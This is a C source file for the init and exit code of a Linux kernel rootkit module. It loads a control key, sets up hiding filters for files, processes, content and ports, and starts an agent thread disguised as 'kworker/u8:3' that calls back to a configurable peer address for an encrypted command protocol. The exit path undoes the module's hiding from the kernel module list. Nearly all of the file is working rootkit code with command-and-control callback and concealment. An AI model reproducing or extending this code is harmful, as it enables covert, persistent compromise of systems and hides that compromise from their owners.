// SPDX-License-Identifier: GPL-2.0
// core/init.c - Module lifecycle: key parsing, crypto init, filter setup,
//               agent thread launch. Callback architecture (connect out).
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/string.h>

#include "rootkit.h"

static char rk_key_hex[RK_KEY_HEX_LEN + 1];
module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);

unsigned short peer_port;
module_param(peer_port, ushort, 0);

char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0);

unsigned int retry_base_ms = 5000;
module_param(retry_base_ms, uint, 0);

unsigned int retry_max_ms = 60000;
module_param(retry_max_ms, uint, 0);

u8 rk_key[RK_KEY_LEN];

struct list_head *rk_saved_prev;
bool rk_module_hidden;
bool rk_persist_active;

static struct task_struct *rk_thread;

static int __init rk_init(void)
{
	int error;

	if (strlen(rk_key_hex) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (!peer_port)
		return -EINVAL;
	if (hex2bin(rk_key, rk_key_hex, RK_KEY_LEN) < 0)
		return -EINVAL;
	memzero_explicit(rk_key_hex, sizeof(rk_key_hex));

	rk_target_init(&rk_file_targets);
	rk_target_init(&rk_pid_targets);
	rk_target_init(&rk_content_targets);
	rk_port_init(&rk_port_targets);

	error = rk_filter_init();
	if (error)
		goto fail_key;

	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		error = PTR_ERR(rk_thread);
		rk_thread = NULL;
		goto fail_filter;
	}

	return 0;

fail_filter:
	rk_filter_exit();
fail_key:
	memzero_explicit(rk_key, sizeof(rk_key));
	return error;
}

static void __exit rk_exit(void)
{
	if (rk_module_hidden) {
		list_add(&THIS_MODULE->list, rk_saved_prev);
		rk_module_hidden = false;
	}

	if (rk_thread)
		kthread_stop(rk_thread);

	rk_filter_exit();
	memzero_explicit(rk_key, sizeof(rk_key));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Full command protocol over encrypted channel");
